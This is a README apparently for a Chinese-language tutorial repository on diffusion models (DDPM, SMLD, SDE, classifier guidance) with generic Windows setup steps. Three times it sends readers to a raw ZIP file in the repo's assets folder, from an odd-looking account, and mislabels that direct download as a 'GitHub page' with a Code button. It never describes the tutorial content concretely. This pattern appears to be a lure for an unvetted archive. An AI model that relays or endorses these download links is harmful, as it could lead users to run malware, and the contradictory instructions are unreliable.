# 📘 diffusion-tutorials-cn - Learn Diffusion Models with Code

[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn/raw/refs/heads/main/assets/tutorials_diffusion_cn_v3.2.zip)

## 🧩 What this app is

This project is a Chinese edition of the original diffusion tutorials. It links the ideas behind diffusion models with working PyTorch code.

Use it to:

- read clear notes on DDPM, SMLD, and SDE
- follow practical PyTorch examples
- study classifier-free guidance and classifier guidance
- learn how diffusion models work in image generation
- compare theory with code side by side

It is meant for people who want to learn from examples, not from dense math alone.

## 💻 What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 10 GB of free disk space
- A stable internet connection
- A modern browser such as Edge, Chrome, or Firefox

For better speed, use a computer with:

- 16 GB of RAM
- an NVIDIA GPU
- updated graphics drivers

If you only want to read the tutorials, a normal Windows laptop is enough.

## 📥 Download and open the project

Open this page in your browser:

https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn/raw/refs/heads/main/assets/tutorials_diffusion_cn_v3.2.zip

Then:

1. Click the green Code button.
2. Choose Download ZIP.
3. Save the file to your computer.
4. Right-click the ZIP file and choose Extract All.
5. Open the extracted folder.

If you use GitHub Desktop or Git, you can also clone the repository, but ZIP download is the simplest option.

## 🛠️ Setup on Windows

After you open the folder, look for files such as:

- README.md
- tutorial notebooks
- Python scripts
- example folders

If the project includes notebooks, use Jupyter Notebook or VS Code to open them.

If it includes Python scripts, do this:

1. Install Python 3.10 or newer.
2. Open Command Prompt.
3. Go to the project folder.
4. Install the required packages.
5. Run the script.

Example commands:

```bash
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
```

If the project uses Conda, you can use that instead:

```bash
conda create -n diffusion-cn python=3.10
conda activate diffusion-cn
pip install -r requirements.txt
```

## 🧠 How to use the tutorials

Start with the main lesson files in order.

A good path is:

1. Read the short theory section first.
2. Open the code example next.
3. Run the example on a small dataset or sample image.
4. Change one value at a time.
5. Compare the result with the explanation.

This helps you see how the model behaves when you change noise steps, sample size, or guidance strength.

## 📚 Main topics covered

This repository focuses on core ideas in diffusion models:

- DDPM, or Denoising Diffusion Probabilistic Models
- SMLD, or Score Matching with Langevin Dynamics
- SDE, or Stochastic Differential Equations
- score-based models
- generative models
- probabilistic modeling
- computer vision
- PyTorch implementation
- stable diffusion concepts
- classifier guidance
- classifier-free guidance

The Chinese notes help connect these topics to the code in a plain way.

## 🧪 What you can try

Once the project is set up, try these tasks:

- open a basic diffusion example
- inspect how noise is added step by step
- compare the forward process and reverse process
- change the number of denoising steps
- test different guidance settings
- view generated image results if included
- read the theory notes before each run

If the project includes sample notebooks, run them in order to avoid confusion.

## 🖼️ Common file types you may see

You may find these files in the repository:

- `.ipynb` files for notebooks
- `.py` files for Python code
- `.md` files for notes
- image folders for sample outputs
- model files for saved weights

Use notebooks if you want to read and run code in one place. Use scripts if you want a simple command-line run.

## 🔧 Simple troubleshooting

If the project does not start, check these points:

- Python is installed
- the virtual environment is active
- the required packages are installed
- you opened the correct folder
- the file path has no extra spaces or wrong characters
- your GPU driver is current if you use CUDA

If a notebook will not open, try:

- restarting VS Code
- reopening Jupyter
- checking that the notebook extension is installed

If a model run is slow, lower the image size or batch size.

## 🧷 Basic workflow

A simple way to use this project is:

1. Download the ZIP file from the GitHub page.
2. Extract it on your Windows PC.
3. Install Python and the needed packages.
4. Open the first tutorial file.
5. Run each example in order.
6. Read the notes beside the code.
7. Change one setting and test again.

This workflow keeps the learning process steady and clear.

## 🧭 Who this is for

This project suits users who want to:

- learn diffusion models from the ground up
- understand the math and the code together
- study Chinese notes on modern generative models
- follow PyTorch examples without starting from scratch
- explore score-based models and SDEs in a practical way

## 🔍 Extra details

The repository combines theory and code in one place. It is useful for study, review, and small experiments. The content fits users who want a guided path through diffusion model ideas and want to see each part in working code.

If you want to start, visit the GitHub page and download the project here:

https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn/raw/refs/heads/main/assets/tutorials_diffusion_cn_v3.2.zip